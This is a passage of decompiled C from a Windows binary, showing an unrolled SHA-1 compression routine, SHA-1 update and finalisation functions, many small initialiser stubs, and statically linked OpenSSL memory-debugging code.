    v210 = __ROL4__(v180 ^ v209 ^ v228 ^ v238, 1);
    v145 = v210 + v162 + __ROL4__(v250, 5) + (v83 ^ v122 ^ v105) + 1859775393;
    v219 = __ROL4__(v190 ^ v218 ^ v184 ^ v25, 1);
    v123 = __ROL4__(v122, 30);
    v163 = v219 + v83 + __ROL4__(v145, 5) + (v250 ^ v123 ^ v105) + 1859775393;
    v251 = __ROL4__(v250, 30);
    v229 = __ROL4__(v200 ^ v228 ^ v194 ^ v27, 1);
    v84 = v229 + v105 + __ROL4__(v163, 5) + (v145 ^ v251 ^ v123) + 1859775393;
    v146 = __ROL4__(v145, 30);
    v185 = __ROL4__(v224 ^ v210 ^ v184 ^ v204, 1);
    v106 = v185 + v123 + __ROL4__(v84, 5) + (v163 ^ v146 ^ v251) + 1859775393;
    v164 = __ROL4__(v163, 30);
    v195 = __ROL4__(v234 ^ v219 ^ v194 ^ v214, 1);
    v33 = v251 + __ROL4__(v106, 5) + (v84 ^ v164 ^ v146);
    v85 = __ROL4__(v84, 30);
    v124 = v195 + v33 + 1859775393;
    v205 = __ROL4__(v180 ^ v229 ^ v204 ^ v242, 1);
    v252 = v205 + v146 + __ROL4__(v124, 5) + (v85 ^ v164 ^ v106) + 1859775393;
    v107 = __ROL4__(v106, 30);
    v215 = __ROL4__(v190 ^ v185 ^ v214 ^ v238, 1);
    v34 = __ROL4__(v124, 30);
    v147 = v215 + v164 + __ROL4__(v252, 5) + (v85 ^ v124 ^ v107) + 1859775393;
    v243 = __ROL4__(v200 ^ v195 ^ v242 ^ v25, 1);
    v165 = v243 + v85 + __ROL4__(v147, 5) + (v252 ^ v34 ^ v107) + 1859775393;
    v253 = __ROL4__(v252, 30);
    v35 = __ROL4__(v224 ^ v219 ^ v215 ^ v25, 1);
    v239 = __ROL4__(v210 ^ v205 ^ v238 ^ v27, 1);
    v36 = v239 + v107 + __ROL4__(v165, 5) + (v147 ^ v253 ^ v34) + 1859775393;
    v148 = __ROL4__(v147, 30);
    v37 = v35 + v34 + __ROL4__(v36, 5) + (v165 ^ v148 ^ v253) + 1859775393;
    v38 = __ROL4__(v165, 30);
    v39 = __ROL4__(v234 ^ v229 ^ v243 ^ v27, 1);
    v86 = __ROL4__(v36, 30);
    v125 = v39 + v253 + __ROL4__(v37, 5) + (v36 ^ v38 ^ v148) + 1859775393;
    v225 = __ROL4__(v224 ^ v180 ^ v185 ^ v239, 1);
    v40 = v225 + v148 + __ROL4__(v125, 5) + (v86 ^ v38 ^ v37) + 1859775393;
    v108 = __ROL4__(v37, 30);
    v235 = __ROL4__(v234 ^ v190 ^ v195 ^ v35, 1);
    v149 = v235 + v38 + __ROL4__(v40, 5) + (v86 ^ v125 ^ v108) + 1859775393;
    v126 = __ROL4__(v125, 30);
    v181 = __ROL4__(v180 ^ v200 ^ v205 ^ v39, 1);
    v166 = v181 + v86 + __ROL4__(v149, 5) + (v40 ^ v126 ^ v108) + 1859775393;
    v254 = __ROL4__(v40, 30);
    v191 = __ROL4__(v225 ^ v190 ^ v210 ^ v215, 1);
    v87 = v191 + v108 + __ROL4__(v166, 5) + (v149 ^ v254 ^ v126) + 1859775393;
    v150 = __ROL4__(v149, 30);
    v201 = __ROL4__(v235 ^ v200 ^ v219 ^ v243, 1);
    v109 = v201 + v126 + __ROL4__(v87, 5) + (v166 ^ v150 ^ v254) + 1859775393;
    v167 = __ROL4__(v166, 30);
    v211 = __ROL4__(v181 ^ v210 ^ v229 ^ v239, 1);
    v41 = v254 + __ROL4__(v109, 5) + (v87 ^ v167 ^ v150);
    v88 = __ROL4__(v87, 30);
    v127 = v211 + v41 + 1859775393;
    v220 = __ROL4__(v191 ^ v219 ^ v185 ^ v35, 1);
    v255 = v220 + v150 + __ROL4__(v127, 5) + (v88 ^ v167 ^ v109) + 1859775393;
    v110 = __ROL4__(v109, 30);
    v230 = __ROL4__(v201 ^ v229 ^ v195 ^ v39, 1);
    v151 = v230 + v167 + __ROL4__(v255, 5) + (v88 ^ v127 ^ v110) + 1859775393;
    v128 = __ROL4__(v127, 30);
    v186 = __ROL4__(v225 ^ v211 ^ v185 ^ v205, 1);
    v42 = __ROL4__(v151, 5) + v186 + v88 + (v255 & v128 | v110 & (v255 | v128)) - 1894007588;
    v256 = __ROL4__(v255, 30);
    v196 = __ROL4__(v235 ^ v220 ^ v195 ^ v215, 1);
    v43 = v196 + v110 + (v151 & v256 | v128 & (v151 | v256));
    v152 = __ROL4__(v151, 30);
    v206 = __ROL4__(v181 ^ v230 ^ v205 ^ v243, 1);
    v89 = __ROL4__(v42, 5) + v43 - 1894007588;
    v168 = __ROL4__(v42, 30);
    v216 = __ROL4__(v191 ^ v186 ^ v215 ^ v239, 1);
    v111 = __ROL4__(v89, 5) + v206 + v128 + (v42 & v152 | v256 & (v42 | v152)) - 1894007588;
    v129 = __ROL4__(v111, 5) + v216 + v256 + (v89 & v168 | v152 & (v89 | v168)) - 1894007588;
    v90 = __ROL4__(v89, 30);
    v244 = __ROL4__(v201 ^ v196 ^ v243 ^ v35, 1);
    v44 = __ROL4__(v129, 5) + v244 + v152 + (v90 & v111 | v168 & (v90 | v111)) - 1894007588;
    v240 = __ROL4__(v211 ^ v206 ^ v239 ^ v39, 1);
    v112 = __ROL4__(v111, 30);
    v257 = v44;
    v45 = __ROL4__(v44, 5) + v240 + v168 + (v129 & v112 | v90 & (v129 | v112)) - 1894007588;
    v130 = __ROL4__(v129, 30);
    v46 = __ROL4__(v225 ^ v220 ^ v216 ^ v35, 1);
    v47 = __ROL4__(v45, 5) + v46 + v90 + (v257 & v130 | v112 & (v257 | v130)) - 1894007588;
    v48 = __ROL4__(v235 ^ v230 ^ v244 ^ v39, 1);
    v258 = __ROL4__(v257, 30);
    v49 = v48 + v112 + (v45 & v258 | v130 & (v45 | v258));
    v50 = __ROL4__(v45, 30);
    v91 = __ROL4__(v47, 5) + v49 - 1894007588;
    v226 = __ROL4__(v225 ^ v181 ^ v186 ^ v240, 1);
    v169 = __ROL4__(v47, 30);
    v113 = __ROL4__(v91, 5) + v226 + v130 + (v47 & v50 | v258 & (v47 | v50)) - 1894007588;
    v236 = __ROL4__(v235 ^ v191 ^ v196 ^ v46, 1);
    v131 = __ROL4__(v113, 5) + v236 + v258 + (v91 & v169 | v50 & (v91 | v169)) - 1894007588;
    v92 = __ROL4__(v91, 30);
    v182 = __ROL4__(v181 ^ v201 ^ v206 ^ v48, 1);
    v51 = v50 + (v92 & v113 | v169 & (v92 | v113));
    v52 = __ROL4__(v113, 30);
    v192 = __ROL4__(v226 ^ v191 ^ v211 ^ v216, 1);
    v259 = __ROL4__(v131, 5) + v182 + v51 - 1894007588;
    v153 = __ROL4__(v259, 5) + v192 + v169 + (v131 & v52 | v92 & (v131 | v52)) - 1894007588;
    v132 = __ROL4__(v131, 30);
    v202 = __ROL4__(v236 ^ v201 ^ v220 ^ v244, 1);
    v53 = v202 + v92 + (v259 & v132 | v52 & (v259 | v132));
    v260 = __ROL4__(v259, 30);
    v212 = __ROL4__(v182 ^ v211 ^ v230 ^ v240, 1);
    v170 = __ROL4__(v153, 5) + v53 - 1894007588;
    v54 = v212 + v52 + (v153 & v260 | v132 & (v153 | v260));
    v154 = __ROL4__(v153, 30);
    v93 = __ROL4__(v170, 5) + v54 - 1894007588;
    v221 = __ROL4__(v192 ^ v220 ^ v186 ^ v46, 1);
    v55 = v221 + v132 + (v170 & v154 | v260 & (v170 | v154));
    v171 = __ROL4__(v170, 30);
    v231 = __ROL4__(v202 ^ v230 ^ v196 ^ v48, 1);
    v114 = __ROL4__(v93, 5) + v55 - 1894007588;
    v133 = __ROL4__(v114, 5) + v231 + v260 + (v93 & v171 | v154 & (v93 | v171)) - 1894007588;
    v94 = __ROL4__(v93, 30);
    v187 = __ROL4__(v226 ^ v212 ^ v186 ^ v206, 1);
    v56 = __ROL4__(v114, 30);
    v197 = __ROL4__(v236 ^ v221 ^ v196 ^ v216, 1);
    v261 = __ROL4__(v133, 5) + v187 + v154 + (v94 & v114 | v171 & (v94 | v114)) - 1894007588;
    v57 = v197 + v171 + (v133 & v56 | v94 & (v133 | v56));
    v134 = __ROL4__(v133, 30);
    v207 = __ROL4__(v182 ^ v231 ^ v206 ^ v244, 1);
    v155 = __ROL4__(v261, 5) + v57 - 1894007588;
    v58 = v207 + v94 + (v261 & v134 | v56 & (v261 | v134));
    v262 = __ROL4__(v261, 30);
    v217 = __ROL4__(v192 ^ v187 ^ v216 ^ v240, 1);
    v172 = __ROL4__(v155, 5) + v58 - 1894007588;
    v95 = __ROL4__(v172, 5) + v217 + v56 + (v155 & v262 | v134 & (v155 | v262)) - 1894007588;
    v59 = __ROL4__(v155, 30);
    v60 = v172 ^ v59 ^ v262;
    v156 = v59;
    v61 = __ROL4__(v202 ^ v197 ^ v244 ^ v46, 1);
    v62 = v134 + __ROL4__(v95, 5) + v61 + v60 - 899497514;
    v63 = __ROL4__(v172, 30);
    v115 = v62;
    v241 = __ROL4__(v212 ^ v207 ^ v240 ^ v48, 1);
    v64 = v241 + (v95 ^ v63 ^ v156) + v262 + __ROL4__(v62, 5) - 899497514;
    v96 = __ROL4__(v95, 30);
    v135 = v64;
    v65 = __ROL4__(v226 ^ v221 ^ v217 ^ v46, 1);
    v66 = v65 + (v96 ^ v63 ^ v115) + v156 + __ROL4__(v64, 5) - 899497514;
    v116 = __ROL4__(v115, 30);
    v263 = v66;
    v67 = __ROL4__(v236 ^ v231 ^ v61 ^ v48, 1);
    v68 = v67 + (v96 ^ v135 ^ v116) + v63 + __ROL4__(v66, 5) - 899497514;
    v136 = __ROL4__(v135, 30);
    v227 = __ROL4__(v226 ^ v182 ^ v187 ^ v241, 1);
    v173 = v227 + (v263 ^ v136 ^ v116) + v96 + __ROL4__(v68, 5) - 899497514;
    v264 = __ROL4__(v263, 30);
    v237 = __ROL4__(v236 ^ v192 ^ v197 ^ v65, 1);
    v97 = v116 + (v68 ^ v264 ^ v136) + v237 + __ROL4__(v173, 5) - 899497514;
    v157 = __ROL4__(v68, 30);
    v183 = __ROL4__(v182 ^ v202 ^ v207 ^ v67, 1);
    v117 = v183 + (v173 ^ v157 ^ v264) + v136 + __ROL4__(v97, 5) - 899497514;
    v174 = __ROL4__(v173, 30);
    v193 = __ROL4__(v227 ^ v192 ^ v212 ^ v217, 1);
    v69 = v193 + (v97 ^ v174 ^ v157) + v264 + __ROL4__(v117, 5) - 899497514;
    v98 = __ROL4__(v97, 30);
    v137 = v69;
    v203 = __ROL4__(v237 ^ v202 ^ v221 ^ v61, 1);
    v70 = v203 + (v98 ^ v174 ^ v117) + v157 + __ROL4__(v69, 5) - 899497514;
    v118 = __ROL4__(v117, 30);
    v213 = __ROL4__(v183 ^ v212 ^ v231 ^ v241, 1);
    v158 = v174 + __ROL4__(v70, 5) + v213 + (v98 ^ v137 ^ v118) - 899497514;
    v138 = __ROL4__(v137, 30);
    v222 = __ROL4__(v193 ^ v221 ^ v187 ^ v65, 1);
    v175 = v222 + (v70 ^ v138 ^ v118) + v98 + __ROL4__(v158, 5) - 899497514;
    v265 = __ROL4__(v70, 30);
    v232 = __ROL4__(v203 ^ v231 ^ v197 ^ v67, 1);
    v99 = v232 + (v158 ^ v265 ^ v138) + v118 + __ROL4__(v175, 5) - 899497514;
    v159 = __ROL4__(v158, 30);
    v188 = __ROL4__(v227 ^ v213 ^ v187 ^ v207, 1);
    v119 = v188 + (v175 ^ v159 ^ v265) + v138 + __ROL4__(v99, 5) - 899497514;
    v176 = __ROL4__(v175, 30);
    v198 = __ROL4__(v237 ^ v222 ^ v197 ^ v217, 1);
    v71 = v198 + (v99 ^ v176 ^ v159) + v265 + __ROL4__(v119, 5) - 899497514;
    v100 = __ROL4__(v99, 30);
    v208 = __ROL4__(v183 ^ v232 ^ v207 ^ v61, 1);
    v266 = v208 + (v100 ^ v176 ^ v119) + v159 + __ROL4__(v71, 5) - 899497514;
    v120 = __ROL4__(v119, 30);
    v72 = __ROL4__(v193 ^ v188 ^ v217 ^ v241, 1);
    v73 = v176 + __ROL4__(v266, 5) + v72 + (v100 ^ v71 ^ v120) - 899497514;
    v139 = __ROL4__(v71, 30);
    v245 = __ROL4__(v203 ^ v198 ^ v61 ^ v65, 1);
    v177 = v245 + (v266 ^ v139 ^ v120) + v100 + __ROL4__(v73, 5) - 899497514;
    v267 = __ROL4__(v266, 30);
    v74 = (v73 ^ v267 ^ v139) + v120 + __ROL4__(v213 ^ v208 ^ v241 ^ v67, 1) + __ROL4__(v177, 5) - 899497514;
    v160 = __ROL4__(v73, 30);
    v75 = v139 + __ROL4__(v227 ^ v222 ^ v72 ^ v65, 1) + __ROL4__(v74, 5) + (v177 ^ v160 ^ v267) - 899497514;
    v178 = __ROL4__(v177, 30);
    *a1 += (v74 ^ v178 ^ v160) + v267 + __ROL4__(v237 ^ v232 ^ v245 ^ v67, 1) + __ROL4__(v75, 5) - 899497514;
    v76 = v178 + a1[3];
    a1[1] += v75;
    v4 = *a1;
    v5 = a1[1];
    v77 = a1[2] + __ROL4__(v74, 30);
    a1[3] = v76;
    v78 = v160 + a1[4];
    v79 = a3-- == 1;
    a1[2] = v77;
    a1[4] = v78;
    if ( v79 )
      break;
    v140 = v77;
    v6 = a1[3];
    v7 = v140;
  }
  return result;
}

//----- (0041F920) --------------------------------------------------------
int __cdecl sub_41F920(int *a1, unsigned int *Src, size_t Size)
{
  size_t v3; // edi
  unsigned int *v4; // ebp
  size_t v5; // eax
  size_t v6; // ecx
  int v7; // eax
  _DWORD *v8; // ebp
  int v10; // ebx
  size_t v11; // ebx

  v3 = Size;
  v4 = Src;
  if ( Size )
  {
    v5 = a1[5];
    v6 = v5 + 8 * Size;
    if ( v6 < v5 )
      ++a1[6];
    a1[6] += Size >> 29;
    v7 = a1[23];
    a1[5] = v6;
    if ( v7 )
    {
      v8 = a1 + 7;
      if ( Size < 0x40 && v7 + Size < 0x40 )
      {
        memcpy((char *)v8 + v7, Src, Size);
        a1[23] += Size;
        return 1;
      }
      v10 = 64 - v7;
      memcpy((char *)v8 + v7, Src, 64 - v7);
      sub_41E3D0(a1, (unsigned int *)a1 + 7, 1);
      v3 = Size - v10;
      a1[23] = 0;
      memset(a1 + 7, 0, 0x40u);
      v4 = (unsigned int *)((char *)Src + v10);
    }
    if ( v3 >> 6 )
    {
      sub_41E3D0(a1, v4, v3 >> 6);
      v11 = v3 >> 6 << 6;
      v4 = (unsigned int *)((char *)v4 + v11);
      v3 -= v11;
    }
    if ( v3 )
    {
      a1[23] = v3;
      memcpy(a1 + 7, v4, v3);
    }
  }
  return 1;
}

//----- (0041FA00) --------------------------------------------------------
int __cdecl sub_41FA00(_BYTE *a1, int a2)
{
  int v2; // ebx
  unsigned int *v3; // esi
  unsigned int v4; // ebx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx

  v2 = *(_DWORD *)(a2 + 92);
  v3 = (unsigned int *)(a2 + 28);
  *(_BYTE *)(v2 + a2 + 28) = 0x80;
  v4 = v2 + 1;
  if ( v4 > 0x38 )
  {
    memset((char *)v3 + v4, 0, 64 - v4);
    v4 = 0;
    sub_41E3D0((int *)a2, v3, 1);
  }
  memset((char *)v3 + v4, 0, 56 - v4);
  *(_BYTE *)(a2 + 84) = *(_BYTE *)(a2 + 27);
  *(_BYTE *)(a2 + 85) = *(_BYTE *)(a2 + 26);
  *(_BYTE *)(a2 + 86) = *(_BYTE *)(a2 + 25);
  *(_BYTE *)(a2 + 87) = *(_BYTE *)(a2 + 24);
  *(_BYTE *)(a2 + 88) = *(_BYTE *)(a2 + 23);
  *(_BYTE *)(a2 + 89) = *(_BYTE *)(a2 + 22);
  *(_BYTE *)(a2 + 90) = *(_BYTE *)(a2 + 21);
  *(_BYTE *)(a2 + 91) = *(_BYTE *)(a2 + 20);
  sub_41E3D0((int *)a2, v3, 1);
  *(_DWORD *)(a2 + 92) = 0;
  memset(v3, 0, 0x40u);
  v5 = *(_DWORD *)a2;
  *a1 = HIBYTE(*(_DWORD *)a2);
  a1[1] = BYTE2(v5);
  a1[2] = BYTE1(v5);
  a1[3] = v5;
  v6 = *(_DWORD *)(a2 + 4);
  a1[4] = HIBYTE(v6);
  a1[5] = BYTE2(v6);
  a1[6] = BYTE1(v6);
  a1[7] = v6;
  v7 = *(_DWORD *)(a2 + 8);
  a1[8] = HIBYTE(v7);
  a1[9] = BYTE2(v7);
  a1[10] = BYTE1(v7);
  a1[11] = v7;
  v8 = *(_DWORD *)(a2 + 12);
  a1[12] = HIBYTE(v8);
  a1[13] = BYTE2(v8);
  a1[14] = BYTE1(v8);
  a1[15] = v8;
  v9 = *(_DWORD *)(a2 + 16);
  a1[16] = HIBYTE(v9);
  a1[17] = BYTE2(v9);
  a1[18] = BYTE1(v9);
  a1[19] = v9;
  return 1;
}

//----- (0041FB70) --------------------------------------------------------
void sub_41FB70()
{
  if ( !sub_41D930(dword_44C8E8) )
  {
    sub_41DC20(0, &dword_44C8E8);
    sub_41DC20(0, &dword_44C918);
  }
}
// 44C8E8: using guessed type int dword_44C8E8;
// 44C918: using guessed type _DWORD dword_44C918;

//----- (0041FBA0) --------------------------------------------------------
void sub_41FBA0()
{
  if ( !sub_41D930(dword_44C940) )
  {
    sub_41DC20(0, &dword_44C940);
    sub_41DC20(0, &dword_44CBC8);
  }
}
// 44C940: using guessed type int dword_44C940;
// 44CBC8: using guessed type _DWORD dword_44CBC8;

//----- (0041FBD0) --------------------------------------------------------
void sub_41FBD0()
{
  if ( !sub_41D930(dword_44CE68) )
  {
    sub_41DC20(0, &dword_44CE68);
    sub_41DC20(0, &dword_44CED0);
  }
}
// 44CE68: using guessed type int dword_44CE68;
// 44CED0: using guessed type _DWORD dword_44CED0;

//----- (0041FC00) --------------------------------------------------------
void sub_41FC00()
{
  if ( !sub_41D930(dword_44CF10) )
  {
    sub_41DC20(0, &dword_44CF10);
    sub_41DC20(0, &dword_44CFB0);
  }
}
// 44CF10: using guessed type int dword_44CF10;
// 44CFB0: using guessed type _DWORD dword_44CFB0;

//----- (0041FC30) --------------------------------------------------------
void sub_41FC30()
{
  if ( !sub_41D930(dword_44D0A8) )
  {
    sub_41DC20(0, &dword_44D0A8);
    sub_41DC20(0, &dword_44D1E8);
  }
}
// 44D0A8: using guessed type int dword_44D0A8;
// 44D1E8: using guessed type _DWORD dword_44D1E8;

//----- (0041FC60) --------------------------------------------------------
void sub_41FC60()
{
  if ( !sub_41D930(dword_44D338) )
  {
    sub_41DC20(0, &dword_44D338);
    sub_41DC20(0, &dword_44D500);
  }
}
// 44D338: using guessed type int dword_44D338;
// 44D500: using guessed type _DWORD dword_44D500;

//----- (0041FC90) --------------------------------------------------------
void sub_41FC90()
{
  if ( !sub_41D930(dword_44D640) )
  {
    sub_41DC20(0, &dword_44D640);
    sub_41DC20(0, &dword_44D7D0);
  }
}
// 44D640: using guessed type int dword_44D640;
// 44D7D0: using guessed type _DWORD dword_44D7D0;

//----- (0041FCC0) --------------------------------------------------------
void sub_41FCC0()
{
  if ( !sub_41D930(dword_44D860) )
  {
    sub_41DC20(0, &dword_44D860);
    sub_41DC20(0, &dword_44D8A0);
  }
}
// 44D860: using guessed type int dword_44D860;
// 44D8A0: using guessed type _DWORD dword_44D8A0;

//----- (0041FCF0) --------------------------------------------------------
void sub_41FCF0()
{
  if ( !sub_41D930(dword_44D8E0) )
  {
    sub_41DC20(0, &dword_44D8E0);
    sub_41DC20(0, &dword_44D9D8);
  }
}
// 44D8E0: using guessed type int dword_44D8E0;
// 44D9D8: using guessed type _DWORD dword_44D9D8;

//----- (0041FD20) --------------------------------------------------------
void sub_41FD20()
{
  if ( !sub_41D930(dword_44DA90) )
  {
    sub_41DC20(0, &dword_44DA90);
    sub_41DC20(0, &dword_44DCA0);
  }
}
// 44DA90: using guessed type int dword_44DA90;
// 44DCA0: using guessed type _DWORD dword_44DCA0;

//----- (0041FD50) --------------------------------------------------------
void sub_41FD50()
{
  if ( !sub_41D930(dword_44DEC8) )
  {
    sub_41DC20(0, &dword_44DEC8);
    sub_41DC20(0, &dword_44E010);
  }
}
// 44DEC8: using guessed type int dword_44DEC8;
// 44E010: using guessed type _DWORD dword_44E010;

//----- (0041FD80) --------------------------------------------------------
void sub_41FD80()
{
  if ( !sub_41D930(dword_44E1D0) )
  {
    sub_41DC20(0, &dword_44E1D0);
    sub_41DC20(0, &dword_44E2E8);
  }
}
// 44E1D0: using guessed type int dword_44E1D0;
// 44E2E8: using guessed type _DWORD dword_44E2E8;

//----- (0041FDB0) --------------------------------------------------------
void sub_41FDB0()
{
  if ( !sub_41D930(dword_44E3D8) )
  {
    sub_41DC20(0, &dword_44E3D8);
    sub_41DC20(0, &dword_44E860);
  }
}
// 44E3D8: using guessed type int dword_44E3D8;
// 44E860: using guessed type _DWORD dword_44E860;

//----- (0041FDE0) --------------------------------------------------------
void sub_41FDE0()
{
  if ( !sub_41D930(dword_44EA38) )
  {
    sub_41DC20(0, &dword_44EA38);
    sub_41DC20(0, &dword_44EA60);
  }
}
// 44EA38: using guessed type int dword_44EA38;
// 44EA60: using guessed type _DWORD dword_44EA60;

//----- (0041FE10) --------------------------------------------------------
void sub_41FE10()
{
  if ( !sub_41D930(dword_44EA80) )
  {
    sub_41DC20(0, &dword_44EA80);
    sub_41DC20(0, &dword_44EAF8);
  }
}
// 44EA80: using guessed type int dword_44EA80;
// 44EAF8: using guessed type _DWORD dword_44EAF8;

//----- (0041FE40) --------------------------------------------------------
void sub_41FE40()
{
  if ( !sub_41D930(dword_44EB10) )
  {
    sub_41DC20(0, &dword_44EB10);
    sub_41DC20(0, &dword_44EBC8);
  }
}
// 44EB10: using guessed type int dword_44EB10;
// 44EBC8: using guessed type _DWORD dword_44EBC8;

//----- (0041FE70) --------------------------------------------------------
void sub_41FE70()
{
  if ( !sub_41D930(dword_44EC50) )
  {
    sub_41DC20(0, &dword_44EC50);
    sub_41DC20(0, &dword_44F068);
  }
}
// 44EC50: using guessed type int dword_44EC50;
// 44F068: using guessed type _DWORD dword_44F068;

//----- (0041FEA0) --------------------------------------------------------
void sub_41FEA0()
{
  if ( !sub_41D930(dword_44F470) )
  {
    sub_41DC20(0, &dword_44F470);
    sub_41DC20(0, &dword_44F5E8);
  }
}
// 44F470: using guessed type int dword_44F470;
// 44F5E8: using guessed type _DWORD dword_44F5E8;

//----- (0041FED0) --------------------------------------------------------
void sub_41FED0()
{
  if ( !sub_41D930(dword_44F6F8) )
  {
    sub_41DC20(0, &dword_44F6F8);
    sub_41DC20(0, &dword_44F7D0);
  }
}
// 44F6F8: using guessed type int dword_44F6F8;
// 44F7D0: using guessed type _DWORD dword_44F7D0;

//----- (0041FF00) --------------------------------------------------------
void sub_41FF00()
{
  if ( !sub_41D930(dword_44F848) )
  {
    sub_41DC20(0, &dword_44F848);
    sub_41DC20(0, &dword_44F9A0);
  }
}
// 44F848: using guessed type int dword_44F848;
// 44F9A0: using guessed type _DWORD dword_44F9A0;

//----- (0041FF30) --------------------------------------------------------
void sub_41FF30()
{
  if ( !sub_41D930(dword_44FA88) )
  {
    sub_41DC20(0, &dword_44FA88);
    sub_41DC20(0, &dword_44FAC8);
  }
}
// 44FA88: using guessed type int dword_44FA88;
// 44FAC8: using guessed type _DWORD dword_44FAC8;

//----- (0041FF60) --------------------------------------------------------
void sub_41FF60()
{
  if ( !sub_41D930(dword_44FAE0) )
  {
    sub_41DC20(0, &dword_44FAE0);
    sub_41DC20(0, dword_4548B4);
  }
}
// 44FAE0: using guessed type int dword_44FAE0;
// 4548B4: using guessed type _DWORD dword_4548B4[2];

//----- (0041FF90) --------------------------------------------------------
void sub_41FF90()
{
  if ( !sub_41D930(dword_44FB18) )
  {
    sub_41DC20(0, &dword_44FB18);
    sub_41DC20(0, &dword_44FDB0);
  }
}
// 44FB18: using guessed type int dword_44FB18;
// 44FDB0: using guessed type _DWORD dword_44FDB0;

//----- (0041FFC0) --------------------------------------------------------
void sub_41FFC0()
{
  if ( !sub_41D930(dword_450008) )
  {
    sub_41DC20(0, &dword_450008);
    sub_41DC20(0, &dword_450098);
  }
}
// 450008: using guessed type int dword_450008;
// 450098: using guessed type _DWORD dword_450098;

//----- (0041FFF0) --------------------------------------------------------
void sub_41FFF0()
{
  if ( !sub_41D930(dword_450110) )
  {
    sub_41DC20(0, &dword_450110);
    sub_41DC20(0, &dword_450300);
  }
}
// 450110: using guessed type int dword_450110;
// 450300: using guessed type _DWORD dword_450300;

//----- (00420020) --------------------------------------------------------
void sub_420020()
{
  if ( !sub_41D930(dword_450510) )
  {
    sub_41DC20(0, &dword_450510);
    sub_41DC20(0, &dword_450690);
  }
}
// 450510: using guessed type int dword_450510;
// 450690: using guessed type _DWORD dword_450690;

//----- (00420050) --------------------------------------------------------
BOOL sub_420050()
{
  BOOL result; // eax
  BOOL v1; // esi
  _DWORD v2[2]; // [esp+0h] [ebp-8h] BYREF

  result = 0;
  if ( (dword_4548C4 & 1) != 0 )
  {
    sub_4208A0(v2);
    sub_41E2C0(5, 20, (int)".\\crypto\\mem_dbg.c", 292);
    v1 = (dword_4548C4 & 2) != 0 || sub_4208C0(byte_4548BC, (unsigned __int8 *)v2);
    sub_41E2C0(6, 20, (int)".\\crypto\\mem_dbg.c", 297);
    return v1;
  }
  return result;
}
// 4548BC: using guessed type unsigned __int8 byte_4548BC[8];
// 4548C4: using guessed type int dword_4548C4;

//----- (004200D0) --------------------------------------------------------
int __cdecl sub_4200D0(int a1)
{
  unsigned int v1; // eax

  v1 = sub_420940(a1);
  return 17851 * v1 + 7 * (v1 >> 14) + 251 * (v1 >> 4);
}

//----- (00420110) --------------------------------------------------------
int sub_420110()
{
  int result; // eax
  _DWORD *v1; // esi
  int v2; // edi
  unsigned int *v3; // eax
  _DWORD v4[7]; // [esp+0h] [ebp-1Ch] BYREF

  result = 0;
  if ( dword_4548D0 )
  {
    sub_4208A0(v4);
    result = sub_420800((_DWORD *)dword_4548D0, (int)v4);
    v1 = (_DWORD *)result;
    if ( result )
    {
      v2 = *(_DWORD *)(result + 20);
      if ( v2 )
      {
        v3 = (unsigned int *)dword_4548D0;
        ++*(_DWORD *)(v2 + 24);
        sub_420770(v3, v2);
      }
      if ( (int)--v1[6] <= 0 )
      {
        v1[5] = 0;
        if ( v2 )
          --*(_DWORD *)(v2 + 24);
        sub_41E130(v1);
      }
      return (int)v1;
    }
  }
  return result;
}
// 4548D0: using guessed type int dword_4548D0;
// 420110: using guessed type _DWORD var_1C[7];

//----- (00420190) --------------------------------------------------------
int __cdecl sub_420190(int a1, int a2, int a3)
{
  _DWORD *v3; // esi
  _DWORD *v4; // eax
  unsigned int *v6; // [esp-14h] [ebp-1Ch]
  _DWORD v7[2]; // [esp+0h] [ebp-8h] BYREF

  if ( sub_420050() )
  {
    sub_41E2C0(9, 20, (int)".\\crypto\\mem_dbg.c", 219);
    if ( (dword_4548C4 & 1) != 0 )
    {
      sub_4208A0(v7);
      if ( !dword_4548D8 || sub_4208C0(byte_4548BC, (unsigned __int8 *)v7) )
      {
        sub_41E2C0(10, 20, (int)".\\crypto\\mem_dbg.c", 251);
        sub_41E2C0(9, 27, (int)".\\crypto\\mem_dbg.c", 258);
        sub_41E2C0(9, 20, (int)".\\crypto\\mem_dbg.c", 259);
        dword_4548C4 &= ~2u;
        sub_420920(byte_4548BC, v7);
      }
      ++dword_4548D8;
    }
    sub_41E2C0(10, 20, (int)".\\crypto\\mem_dbg.c", 281);
    v3 = sub_41DFF0(28, (int)".\\crypto\\mem_dbg.c", 404);
    if ( v3 )
    {
      if ( dword_4548D0
        || (dword_4548D0 = (int)sub_4206F0(
                                  (int (__cdecl *)(char *))sub_4200D0,
                                  (int (__cdecl *)(const char *, const char *))sub_41D5F0)) != 0 )
      {
        sub_4208A0(v3);
        v3[2] = a2;
        v6 = (unsigned int *)dword_4548D0;
        v3[3] = a3;
        v3[4] = a1;
        v3[6] = 1;
        v3[5] = 0;
        v4 = sub_420770(v6, (int)v3);
        if ( v4 )
          v3[5] = v4;
      }
      else
      {
        sub_41E130(v3);
      }
    }
    sub_41E2C0(9, 20, (int)".\\crypto\\mem_dbg.c", 219);
    if ( (dword_4548C4 & 1) != 0 )
    {
      if ( dword_4548D8 )
      {
        if ( !--dword_4548D8 )
        {
          dword_4548C4 |= 2u;
          sub_41E2C0(10, 27, (int)".\\crypto\\mem_dbg.c", 272);
        }
      }
    }
    sub_41E2C0(10, 20, (int)".\\crypto\\mem_dbg.c", 281);
  }
  return 0;
}
// 4548BC: using guessed type unsigned __int8 byte_4548BC[8];
// 4548C4: using guessed type int dword_4548C4;
// 4548D0: using guessed type int dword_4548D0;
// 4548D8: using guessed type int dword_4548D8;

//----- (00420360) --------------------------------------------------------
BOOL sub_420360()
{
  BOOL v0; // esi
  _DWORD v2[2]; // [esp+4h] [ebp-8h] BYREF

  v0 = 0;
  if ( sub_420050() )
  {
    sub_41E2C0(9, 20, (int)".\\crypto\\mem_dbg.c", 219);
    if ( (dword_4548C4 & 1) != 0 )
    {
      sub_4208A0(v2);
      if ( !dword_4548D8 || sub_4208C0(byte_4548BC, (unsigned __int8 *)v2) )
      {
        sub_41E2C0(10, 20, (int)".\\crypto\\mem_dbg.c", 251);
        sub_41E2C0(9, 27, (int)".\\crypto\\mem_dbg.c", 258);
        sub_41E2C0(9, 20, (int)".\\crypto\\mem_dbg.c", 259);
        dword_4548C4 &= ~2u;
        sub_420920(byte_4548BC, v2);
      }
      ++dword_4548D8;
    }
    sub_41E2C0(10, 20, (int)".\\crypto\\mem_dbg.c", 281);
    v0 = sub_420110() != 0;
    sub_41E2C0(9, 20, (int)".\\crypto\\mem_dbg.c", 219);
    if ( (dword_4548C4 & 1) != 0 )
    {
